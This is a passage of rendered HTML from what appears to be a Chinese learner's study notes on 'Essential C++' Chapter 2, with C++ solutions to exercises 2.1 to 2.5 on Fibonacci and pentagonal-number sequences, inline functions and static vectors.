&quot;</span> &lt;&lt; elem &lt;&lt;endl;</span><br><span class=\"line\">\t<span class=\"keyword\">else</span> \tcout &lt;&lt; <span class=\"string\">&quot;sorry, could not calculate element # &quot;</span>&lt;&lt; pos &lt;&lt;endl;</span><br><span class=\"line\">&#125;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">bool</span> <span class=\"title\">fibon_elem</span><span class=\"params\">(<span class=\"type\">int</span> pos,<span class=\"type\">int</span> &amp;elem)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (pos &lt;=<span class=\"number\">0</span> || pos &gt;<span class=\"number\">1024</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\telem=<span class=\"number\">0</span>;<span class=\"keyword\">return</span> <span class=\"literal\">false</span>;&#125;</span><br><span class=\"line\">\telem =<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"type\">int</span> n_1 = <span class=\"number\">1</span>,n_2=<span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=<span class=\"number\">3</span>;ix&lt;=pos;++ix)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\telem = n_2+n_1;</span><br><span class=\"line\">\t\tn_1 = n_2;</span><br><span class=\"line\">\t\tn_2 = elem;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"练习2-2\"><a href=\"#练习2-2\" class=\"headerlink\" title=\"练习2.2\"></a>练习2.2</h3><p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230504203111851.png\" alt=\"image-20230504203111851\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> num)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">display</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">vec</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;please input the num you want,exit:-1&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">  <span class=\"type\">int</span> num;</span><br><span class=\"line\">  cin &gt;&gt; num;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (num == <span class=\"number\">-1</span>) <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  <span class=\"built_in\">add</span>(vec,num);</span><br><span class=\"line\">  <span class=\"built_in\">display</span>(vec);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> num)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">if</span> (num&lt;=<span class=\"number\">0</span> || num &gt; <span class=\"number\">1024</span>)</span><br><span class=\"line\">   &#123;</span><br><span class=\"line\">     cerr &lt;&lt; <span class=\"string\">&quot;warning:num is wrong&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">   \t <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);            <span class=\"comment\">//exit的写法是错的!!!</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">  <span class=\"type\">int</span> pn=<span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=vec.<span class=\"built_in\">size</span>()+<span class=\"number\">1</span>;ix&lt;=num;ix++) <span class=\"comment\">//这样的话,就不用重复添加了,</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pn = (ix*(<span class=\"number\">3</span>*ix - <span class=\"number\">1</span>))/<span class=\"number\">2</span>;</span><br><span class=\"line\">    vec.<span class=\"built_in\">push_back</span>(pn);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">display</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=<span class=\"number\">0</span>;ix &lt; vec.<span class=\"built_in\">size</span>(); ++ix)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    cout &lt;&lt; vec[ix] &lt;&lt; <span class=\"string\">&#x27; &#x27;</span> ;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  cout &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"练习2-3\"><a href=\"#练习2-3\" class=\"headerlink\" title=\"练习2.3\"></a>练习2.3</h3><p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230504213422093.png\" alt=\"image-20230504213422093\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">is_size_ok</span><span class=\"params\">(<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">display</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">vec</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;please input the num you want&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">  <span class=\"type\">int</span> size;</span><br><span class=\"line\">  cin &gt;&gt; size;</span><br><span class=\"line\">  <span class=\"built_in\">add</span>(vec,size);</span><br><span class=\"line\">  <span class=\"built_in\">display</span>(vec);</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">is_size_ok</span><span class=\"params\">(<span class=\"type\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">int</span> max_size = <span class=\"number\">1024</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(size &lt;=<span class=\"number\">0</span> || size &gt; max_size)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">     cerr &lt;&lt; <span class=\"string\">&quot;warning:num is wrong&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (!<span class=\"built_in\">is_size_ok</span>(size))</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">  <span class=\"type\">int</span> pn=<span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=<span class=\"number\">1</span>;ix&lt;=size;ix++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pn = (ix*(<span class=\"number\">3</span>*ix - <span class=\"number\">1</span>))/<span class=\"number\">2</span>;</span><br><span class=\"line\">    vec.<span class=\"built_in\">push_back</span>(pn);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">display</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=<span class=\"number\">0</span>;ix &lt; vec.<span class=\"built_in\">size</span>(); ++ix)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    cout &lt;&lt; vec[ix] &lt;&lt; <span class=\"string\">&#x27; &#x27;</span> ;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  cout &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>答案给的版本翻译过来</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">display</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">really_add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> size)</span></span>; <span class=\"comment\">//答案给的这里用了extern,不过在同一文件里不用</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt; <span class=\"title\">vec</span><span class=\"params\">(<span class=\"number\">0</span>)</span></span>;</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;please input the num you want&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">  <span class=\"type\">int</span> size;</span><br><span class=\"line\">  cin &gt;&gt; size;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(<span class=\"built_in\">add</span>(vec,size))</span><br><span class=\"line\">\t  <span class=\"built_in\">display</span>(vec);</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">const</span> <span class=\"type\">int</span> max_size = <span class=\"number\">1024</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(size &lt;=<span class=\"number\">0</span> || size &gt; max_size)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">     cerr &lt;&lt; <span class=\"string\">&quot;warning:num is wrong&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (vec.<span class=\"built_in\">size</span>() &lt; size)</span><br><span class=\"line\">    <span class=\"built_in\">really_add</span>(vec,size);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">really_add</span><span class=\"params\">(vector&lt;<span class=\"type\">int</span>&gt; &amp;vec,<span class=\"type\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">   <span class=\"type\">int</span> pn=<span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=vec.<span class=\"built_in\">size</span>()+<span class=\"number\">1</span>;ix&lt;=size;ix++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pn = (ix*(<span class=\"number\">3</span>*ix - <span class=\"number\">1</span>))/<span class=\"number\">2</span>;</span><br><span class=\"line\">    vec.<span class=\"built_in\">push_back</span>(pn);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">display</span><span class=\"params\">(<span class=\"type\">const</span> vector&lt;<span class=\"type\">int</span>&gt; &amp;vec)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=<span class=\"number\">0</span>;ix &lt; vec.<span class=\"built_in\">size</span>(); ++ix)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    cout &lt;&lt; vec[ix] &lt;&lt; <span class=\"string\">&#x27; &#x27;</span> ;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  cout &lt;&lt; endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"练习2-4\"><a href=\"#练习2-4\" class=\"headerlink\" title=\"练习2.4\"></a>练习2.4</h3><p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230504214621071.png\" alt=\"image-20230504214621071\"></p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;iostream&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;vector&gt;</span></span></span><br><span class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> std;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">show</span><span class=\"params\">(<span class=\"type\">int</span> num)</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">is_size_ok</span><span class=\"params\">(<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"><span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt;* <span class=\"title\">store</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"type\">int</span> size)</span></span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;please input the size you want&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">  <span class=\"type\">int</span> size,num;</span><br><span class=\"line\">  cin &gt;&gt; size;</span><br><span class=\"line\">  <span class=\"built_in\">add</span>(size);</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;please input the num you want&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">  cin &gt;&gt; num;</span><br><span class=\"line\">  <span class=\"built_in\">show</span>(num);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">inline</span> <span class=\"type\">bool</span> <span class=\"title\">is_size_ok</span><span class=\"params\">(<span class=\"type\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">const</span> <span class=\"type\">int</span> max_size = <span class=\"number\">1024</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span>(size &lt;=<span class=\"number\">0</span> || size &gt; max_size)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">     cerr &lt;&lt; <span class=\"string\">&quot;warning:num is wrong&quot;</span> &lt;&lt; endl;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\">vector&lt;<span class=\"type\">int</span>&gt;* <span class=\"title\">store</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"type\">static</span> vector&lt;<span class=\"type\">int</span>&gt; vecp;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> &amp;vecp;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">add</span><span class=\"params\">(<span class=\"type\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"built_in\">is_size_ok</span>(size))</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">  vector&lt;<span class=\"type\">int</span>&gt;* vecp= <span class=\"built_in\">store</span>();</span><br><span class=\"line\">  vector&lt;<span class=\"type\">int</span>&gt;&amp; vec = *vecp;</span><br><span class=\"line\">  <span class=\"type\">int</span> pn=<span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> (<span class=\"type\">int</span> ix=vec.<span class=\"built_in\">size</span>();ix&lt;=size;ix++)</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    pn = (ix*(<span class=\"number\">3</span>*ix - <span class=\"number\">1</span>))/<span class=\"number\">2</span>;</span><br><span class=\"line\">    vec.<span class=\"built_in\">push_back</span>(pn);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">show</span><span class=\"params\">(<span class=\"type\">int</span> num)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  vector&lt;<span class=\"type\">int</span>&gt;* vecp= <span class=\"built_in\">store</span>();</span><br><span class=\"line\">  vector&lt;<span class=\"type\">int</span>&gt;&amp; vec = *vecp;</span><br><span class=\"line\">  cout &lt;&lt; <span class=\"string\">&quot;this:&quot;</span> &lt;&lt;vec[num]&lt;&lt;endl;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"练习2-5\"><a href=\"#练习2-5\" class=\"headerlink\" title=\"练习2.5\"></a>练习2.5</h3><p><img src=\"/c++%E5%85%A5%E9%97%A8-1-%E3%80%8AEssential-c++%E3%80%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E9%9D%A2%E5%90%91%E8%BF%87%E7%A8%8B/image-20230504214628121.png\" alt=\"image-20230504214628121\"></p>\n<p>inline 的话,就不用再声明了?</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span 